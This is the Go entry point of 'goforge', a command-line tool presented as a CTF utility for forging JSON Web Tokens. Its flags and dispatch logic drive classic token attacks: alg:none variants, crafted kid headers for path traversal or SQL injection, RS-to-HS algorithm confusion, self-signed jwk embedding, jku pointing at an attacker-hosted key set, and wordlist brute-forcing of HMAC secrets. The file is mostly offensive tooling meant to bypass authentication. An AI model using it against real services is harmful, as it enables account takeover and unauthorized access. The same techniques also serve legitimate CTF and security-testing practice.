// Command goforge is a CTF JWT reforging tool: it decodes, inspects, modifies
// and re-signs tokens, and implements the classic attacks on the algorithm and
// the header (alg:none, kid, confusion RS->HS, jwk, jku).
// See the README for usage. Interactive mode: goforge -i.
package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"goforge/internal/attack"
	"goforge/internal/forge"
	"goforge/internal/jwt"
	"os"
	"runtime"
	"strings"
)

const (
	cyan  = "\033[36m"
	bold  = "\033[1m"
	reset = "\033[0m"
)

// defining a new type used for flag
type setFlags []string

func (s *setFlags) String() string {
	return strings.Join(*s, ", ") // help command
}

func (s *setFlags) Set(value string) error {
	*s = append(*s, value) // adding every string behind --set flag
	return nil
}

func main() {

	var key string
	flag.StringVar(&key, "key", "", "Key used to forge the JWT")
	flag.StringVar(&key, "k", "", "Key used to forge the JWT (shorthand)")
	var sets setFlags
	flag.Var(&sets, "set", "field=value (repeatable)")
	var wordlist string
	flag.StringVar(&wordlist, "wordlist", "", "Wordlist to bruteforce the key")
	flag.StringVar(&wordlist, "w", "", "Wordlist (shorthand)")
	var noneAttack bool
	flag.BoolVar(&noneAttack, "none", false, "Forge a token with alg:none")
	var analyse bool
	flag.BoolVar(&analyse, "analyse", false, "Pretty-print the token (header/payload/signature)")
	flag.BoolVar(&analyse, "a", false, "Pretty-print the token (shorthand)")
	var kidFlag string
	flag.StringVar(&kidFlag, "kid", "", "Inject a crafted kid header (path traversal, SQLi...)")
	var confusion bool
	flag.BoolVar(&confusion, "confusion", false, "RS -> HS algorithm confusion attack")
	flag.BoolVar(&confusion, "c", false, "RS -> HS confusion (shorthand)")
	var pubKeyFile string
	flag.StringVar(&pubKeyFile, "public-key", "", "Path to the server's public key (PEM) for confusion")
	flag.StringVar(&pubKeyFile, "pk", "", "Path to the server's public key (shorthand)")
	var jwkAttack bool
	flag.BoolVar(&jwkAttack, "jwk", false, "Embed a self-generated public key (jwk header)")
	var jkuURL string
	flag.StringVar(&jkuURL, "jku", "", "Attacker-controlled URL hosting the JWKS")
	var token string
	flag.StringVar(&token, "token", "", "JWT to forge (string or @file)")
	flag.StringVar(&token, "t", "", "JWT to forge (shorthand)")
	var interactive bool
	flag.BoolVar(&interactive, "i", false, "Interactive mode")
	flag.BoolVar(&interactive, "interactive", false, "Interactive mode")

	flag.Parse()

	if interactive {
		runInteractive()
		return
	}

	bigBanner()

	key, err := resolveValue(key)
	if err != nil {
		fmt.Println("[!] ", err)
		os.Exit(1)
	}

	if token == "" {
		token = flag.Arg(0) // fallback: positional argument
	}
	if token == "" {
		fmt.Println("Usage: goforge [--token <jwt|@file> | <token>] [flags]")
		os.Exit(1)
	}
	token, err = resolveValue(token) // @file = read from file, else literal
	if err != nil {
		fmt.Println("[!]", err)
		os.Exit(1)
	}
	token = strings.TrimSpace(token) // a JWT never contains whitespace

	tok, err := jwt.Parse(token)
	if err != nil {
		fmt.Println("[!] ", err)
		os.Exit(1)
	}

	alg, ok := tok.Header["alg"].(string)
	if !ok {
		fmt.Println("[!] 'alg' field missing")
		os.Exit(1)
	}

	if analyse {
		prettyHeader, _ := json.MarshalIndent(tok.Header, "", "  ")
		prettyBody, _ := json.MarshalIndent(tok.Payload, "", "  ")
		printSection("HEADER")
		fmt.Println(string(prettyHeader) + "\n")
		printSection("PAYLOAD")
		fmt.Println(string(prettyBody) + "\n")
		printSection("SIGNATURE")
		fmt.Println(tok.Parts[2])
		os.Exit(0)
	}

	if err := replaceValue(sets, tok.Payload); err != nil {
		fmt.Println("[!]", err)
		os.Exit(1)
	}

	// reforging JWT
	o := forge.Options{Alg: alg}

	var forged string
	switch {
	case noneAttack:
		variants := []string{"none", "None", "NONE", "nOnE"}
		fmt.Println("[+] alg:none variants:")
		for _, v := range variants {
			o.Alg = v
			t, ferr := forge.None(tok.Header, tok.Payload, o)
			if ferr != nil {
				fmt.Println("[!] ", ferr)
				os.Exit(1)
			}
			fmt.Printf("  [%s] %s\n", v, t)
		}
		os.Exit(0)
	case kidFlag != "":
		o.Kid = kidFlag
		o.Key = key
		forged, err = forge.Kid(tok.Header, tok.Payload, o)
	case confusion:
		if pubKeyFile == "" {
			fmt.Println("[!] --confusion requires --public-key <file>")
			os.Exit(1)
		}
		var pub []byte
		pub, err = os.ReadFile(pubKeyFile)
		if err != nil {
			fmt.Println("[!] read public key:", err)
			os.Exit(1)
		}
		o.Key = string(pub)
		forged, err = forge.Confusion(tok.Header, tok.Payload, o)
	case jwkAttack:
		forged, err = forge.JWK(tok.Header, tok.Payload, o)
	case jkuURL != "":
		o.JkuURL = jkuURL
		var jwks string
		forged, jwks, err = forge.JKU(tok.Header, tok.Payload, o)
		if err == nil {
			fmt.Printf("[*] Host this JWKS at %s :\n%s\n\n", jkuURL, jwks)
		}
	default:
		o.Key, err = resolveKey(key, wordlist, tok.Parts, alg)
		if err != nil {
			fmt.Println("[!] ", err)
			os.Exit(1)
		}
		forged, err = forge.HMAC(tok.Header, tok.Payload, o)
	}
	if err != nil {
		fmt.Println("[!] ", err)
		os.Exit(1)
	}
	fmt.Println("[+] Forged token:\n" + forged)
}

/*
=====================
===== Functions =====
=====================
*/

// replaceValue applies the --set modifications (field=value) to the payload.
// The value is parsed as JSON (true -> bool, 123 -> number, otherwise string).
// Returns an error on invalid format; the caller decides what to do.
func replaceValue(sets setFlags, body map[string]any) error {
	for _, value := range sets {
		newVals := strings.SplitN(value, "=", 2)
		if len(newVals) != 2 {
			return fmt.Errorf("expected format field=value, received: %s", value)
		}
		var parsed any
		if _, ok := body[newVals[0]]; !ok {
			fmt.Println("[i] Field didn't exist, new field added:", newVals[0])
		}
		if err := json.Unmarshal([]byte(newVals[1]), &parsed); err == nil {
			body[newVals[0]] = parsed
		} else {
			body[newVals[0]] = newVals[1]
		}
	}
	return nil
}

func resolveKey(key, wordlist string, parts []string, alg string) (string, error) {
	if key != "" {
		return key, nil
	}
	if wordlist != "" {
		found, err := attack.BruteforceKey(parts, wordlist, runtime.NumCPU(), alg)
		if err != nil {
			return "", err
		}
		if found == "" {
			return "", fmt.Errorf("no key found in the wordlist")
		}
		fmt.Println("[+] Key found in the wordlist:", found)
		return found, nil
	}
	return "", fmt.Errorf("provide --key or --wordlist")
}

func printSection(title string) {
	line := strings.Repeat("━", 46)
	fmt.Printf("%s%s%s\n", cyan, line, reset)
	fmt.Printf("  %s%s%s%s\n", bold, cyan, title, reset)
	fmt.Printf("%s%s%s\n", cyan, line, reset)
}

func resolveValue(v string) (string, error) {
	if strings.HasPrefix(v, "@") {
		data, err := os.ReadFile(v[1:]) // v[1:] = everything without '@'
		if err != nil {
			return "", fmt.Errorf("read file %s: %w", v[1:], err)
		}
		return strings.TrimRight(string(data), "\r\n"), nil // strip trailing newline(s)
	}
	return v, nil
}
